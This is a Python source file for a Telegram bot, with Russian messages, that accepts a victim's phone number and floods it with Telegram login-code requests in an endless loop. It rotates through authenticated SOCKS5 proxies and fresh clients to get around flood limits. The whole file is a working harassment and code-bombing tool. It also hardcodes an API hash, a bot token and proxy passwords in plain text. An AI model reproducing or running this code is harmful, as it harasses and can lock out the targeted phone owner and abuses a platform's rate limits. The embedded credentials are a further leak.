import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telethon import TelegramClient
from telethon.errors import FloodWaitError
from telethon.network.connection import ConnectionTcpAbridged
import socks

API_ID = 35911533
API_HASH = "11dafcdc1514796c867055023716d39a"
BOT_TOKEN = "8830187981:AAGZu4sKhuTpTSI8sPgliF2lvXYJotP1k1s"

PROXIES = [
    None,
    {'ip': '185.192.110.221', 'port': 8000, 'user': 'hTJ2Cc', 'password': 'fNxamo'},
    {'ip': '185.191.142.220', 'port': 8000, 'user': 'hTJ2Cc', 'password': 'fNxamo'},
    {'ip': '185.184.78.155', 'port': 8000, 'user': 'hTJ2Cc', 'password': 'fNxamo'}
]

spam_tasks = {}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Отправь номер телефона в формате +7XXXXXXXXXX или +380XXXXXXXXX для спама кодами.")

async def stop_spam(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id in spam_tasks:
        task = spam_tasks.pop(chat_id)
        if not task.done():
            task.cancel()
            try:
                await task
            except asyncio.CancelledError:
                pass
        await update.message.reply_text("Спам остановлен.")
    else:
        await update.message.reply_text("Нет активного спама.")

async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text.strip()
    chat_id = update.effective_chat.id
    if chat_id in spam_tasks:
        await update.message.reply_text("Уже идет спам для этого чата.")
        return

    async def spam():
        count = 0
        idx = 0
        while True:
            proxy = PROXIES[idx % len(PROXIES)]
            idx += 1
            label = "локальный" if proxy is None else f"{proxy['ip']}:{proxy['port']}"
            try:
                if proxy is None:
                    client = TelegramClient(None, API_ID, API_HASH, connection=ConnectionTcpAbridged)
                else:
                    proxy_tuple = (socks.SOCKS5, proxy['ip'], proxy['port'], proxy['user'], proxy['password'])
                    client = TelegramClient(None, API_ID, API_HASH, proxy=proxy_tuple, connection=ConnectionTcpAbridged)
                await client.connect()
                await client.send_code_request(phone)
                count += 1
                await context.bot.send_message(chat_id, f"Отправлен код #{count} на номер {phone} через {label}")
                await client.disconnect()
                await asyncio.sleep(0.5)
            except FloodWaitError as e:
                await context.bot.send_message(chat_id, f"FloodWait {e.seconds} сек на {label}")
                await asyncio.sleep(e.seconds)
            except Exception as e:
                err = str(e)
                if "all available options" in err or "ResendCodeRequest" in err:
                    await context.bot.send_message(chat_id, f"⚠️ {label}: все методы использованы, переключение")
                elif "Connection to Telegram failed" in err:
                    await context.bot.send_message(chat_id, f"⚠️ {label}: коннект-фейл, переключение")
                else:
                    await context.bot.send_message(chat_id, f"⚠️ {label}: {err[:60]}, переключение")
                if client:
                    await client.disconnect()
            await asyncio.sleep(0.1)

    task = asyncio.create_task(spam())
    spam_tasks[chat_id] = task
    await update.message.reply_text("Запущен спам (новый клиент для каждой попытки). /stop для остановки.")

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stop", stop_spam))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_phone))
    app.run_polling()

if __name__ == "__main__":
    main()
